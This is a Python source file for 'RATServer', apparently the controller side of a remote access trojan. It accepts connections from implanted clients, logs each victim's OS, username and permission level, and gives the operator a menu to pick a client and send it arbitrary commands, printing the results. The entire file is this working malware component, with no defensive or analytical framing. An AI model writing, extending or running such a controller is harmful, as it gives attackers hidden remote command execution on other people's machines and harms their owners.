import socket
import threading
import datetime
import time
from ping3 import ping
from rich import print
import logging

class RATServer:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.is_running = False
        self.server_socket = None
        self.clients = {}
        self.selected_client = None
        self.logger = self.setup_logger()

    def setup_logger(self):
        logger = logging.getLogger('RATServer')
        logger.setLevel(logging.INFO)
        formatter = logging.Formatter('%(asctime)s - %(message)s')
        file_handler = logging.FileHandler('server.log')
        file_handler.setFormatter(formatter)
        logger.addHandler(file_handler)
        return logger

    def start(self):
        self.is_running = True
        print("[bold red]Server online & listening on {}:{}".format(self.host, self.port))
        threading.Thread(target=self.run).start()

    def stop(self):
        self.is_running = False
        if self.server_socket:
            self.server_socket.close()
            print("[bold red]Server stopped")
        exit()

    def run(self):
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(5)

        while self.is_running:
            try:
                client_socket, client_address = self.server_socket.accept()
                threading.Thread(target=self.handle_client, args=(client_socket, client_address)).start()
            except Exception as e:
                if self.is_running:
                    print("[bold red]Error accepting connection:", e)
                    break

    def handle_client(self, client_socket, client_address):
        try:
            data = client_socket.recv(1024).decode()
            if data:
                os_info = data.split(";")
                if len(os_info) == 3:
                    client_info = {
                        "socket": client_socket,
                        "address": client_address,
                        "connection_time": datetime.datetime.now(),
                        "os": os_info[0],
                        "username": os_info[1],
                        "permission": os_info[2]
                    }
                    self.clients[client_address] = client_info
                    self.logger.info('New client connected: {}'.format(client_address))
                else:
                    print("[bold red]Invalid data format received from client")
        except Exception as e:
            print("[bold red]Error handling client:", e)
            if client_address in self.clients:
                self.clients.pop(client_address)
            return

        while True:
            try:
                data = client_socket.recv(1024)
                if not data:
                    print("\n[bold red]Client {} disconnected".format(client_address))
                    if client_address in self.clients:
                        self.clients.pop(client_address)
                    self.logger.info('Client {} disconnected'.format(client_address))
                    break
                elif data.decode().startswith("COMMAND_RESULT:"):
                    self.handle_command_result(data.decode().replace("COMMAND_RESULT:", ""))
                else:
                    self.display_message(data.decode())
            except Exception as e:
                print("[bold red]Error receiving data from client {}: {}".format(client_address, e))
                if client_address in self.clients:
                    self.clients.pop(client_address)
                break

    def display_menu(self):
        print("\n[bold cyan]Main Menu:")
        print("[bold cyan]1. List Connected Clients")
        print("[bold cyan]2. Select Client")
        print("[bold cyan]3. Show Last 10 Log Messages")
        print("[bold cyan]4. Stop Server")

    def run_menu(self):
        while self.is_running:
            self.display_menu()
            option = input("Enter option number: ").strip()

            if option == "1":
                self.print_connected_clients()
            elif option == "2":
                self.select_client()
            elif option == "3":
                self.show_last_10_log_messages()
            elif option == "4":
                self.stop()
                break
            else:
                print("[bold red]Invalid option. Please try again.")

    def print_connected_clients(self):
        print("\n[bold cyan]Connected Clients:")
        for i, client_address in enumerate(self.clients, start=1):
            client_info = self.clients[client_address]
            print("[bold cyan]{}. {} - {}".format(i, client_address[0], client_info['address'][1]))

    def select_client(self):
        self.print_connected_clients()
        client_number = input("Enter client number (0 to cancel): ").strip()
        if client_number == "0":
            return
        client_index = int(client_number) - 1
        if 0 <= client_index < len(self.clients):
            self.selected_client = list(self.clients.keys())[client_index]
            self.run_client_menu()
        else:
            print("[bold red]Invalid client number.")

    def run_client_menu(self):
        while self.is_running:
            print("\n[bold cyan]Client Menu - {}:{}".format(self.clients[self.selected_client]['address'][0],
                                                             self.clients[self.selected_client]['address'][1]))
            print("[bold cyan]1. Display Information")
            print("[bold cyan]2. Execute Command")
            print("[bold cyan]3. Back")

            option = input("Enter option number: ").strip()

            if option == "1":
                self.display_client_info()
            elif option == "2":
                self.execute_command()
            elif option == "3":
                self.selected_client = None
                break
            else:
                print("[bold red]Invalid option. Please try again.")

    def display_client_info(self):
        client_info = self.clients[self.selected_client]
        ping_time = self.calculate_ping(client_info['address'][0])  # Calcula o ping do cliente
        print("\n[bold cyan]Client Information:")
        print("[bold cyan]IP Address: {}".format(client_info['address'][0]))
        print("[bold cyan]Port: {}".format(client_info['address'][1]))
        print("[bold cyan]OS: {}".format(client_info['os']))
        print("[bold cyan]User: {}".format(client_info['username']))
        print("[bold cyan]Permission: {}".format(client_info['permission']))
        print("[bold cyan]Connection Date: {}".format(client_info['connection_time']))
        print("[bold cyan]Ping: {} ms".format(ping_time))

    def execute_command(self):
        client_os = self.clients[self.selected_client]['os']
        command = input("Enter command to execute on the {} client: ".format(client_os)).strip()
        self.send_command_to_client(self.selected_client, command)

    def send_command_to_client(self, client_address, command):
        client_socket = self.clients[client_address]["socket"]
        try:
            client_socket.send("COMMAND:{}".format(command).encode())
        except Exception as e:
            print("[bold red]Error sending command to client: {}".format(e))

    def calculate_ping(self, ip_address):
        try:
            ping_time = ping(ip_address)
            if ping_time is not None:
                return round(ping_time * 1000, 2)  # Converte para milissegundos e arredonda para duas casas decimais
            else:
                return "N/A"  # Se não for possível calcular o ping, retorna "N/A"
        except Exception as e:
            print("[bold red]Error calculating ping: {}".format(e))
            return "N/A"

    def display_message(self, message):
        print(message)

    def handle_command_result(self, result):
        print(result)

    def show_last_10_log_messages(self):
        try:
            with open('server.log', 'r') as file:
                lines = file.readlines()
                last_10_messages = lines[-10:]
                print("\n[bold cyan]Last 10 Log Messages:")
                for message in last_10_messages:
                    print(message.strip())
        except Exception as e:
            print("[bold red]Error reading log file: {}".format(e))


if __name__ == "__main__":
    server = RATServer("10.109.28.46", 55555)
    server.start()
    time.sleep(1)
    server.run_menu()
